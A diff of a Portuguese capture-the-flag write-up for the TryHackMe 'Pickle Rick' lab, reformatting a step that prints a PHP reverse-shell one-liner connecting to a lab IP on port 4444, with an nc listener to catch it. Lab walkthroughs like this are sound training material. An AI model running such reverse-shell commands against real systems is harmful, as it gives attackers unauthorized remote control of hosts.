@@ -87,11 +87,11 @@ Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
 
 ![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick3-ctf.JPG)
 
-Podemos ir no [REVSHELLS](https://www.revshells.com/) para pegarmos uma shell e usarmos:
+- Agora podemos ir no **[REVSHELLS](https://www.revshells.com/)** para pegarmos uma shell e usarmos:
 
-> php -r '$sock=fsockopen("10.10.181.45",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+- > php -r '$sock=fsockopen("10.10.181.45",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 
-> nc -nlvp 4444 //para pegarmos a conexão na nossa máquina
+- > nc -nlvp 4444 //para pegarmos a conexão na nossa máquina
 
 ![CTF IMG](https://github.com/wendelfraga/writeups-and-cbsnotes/blob/main/CTFS/TryHackMe/assets/pickle-rick4-ctf.JPG)
 
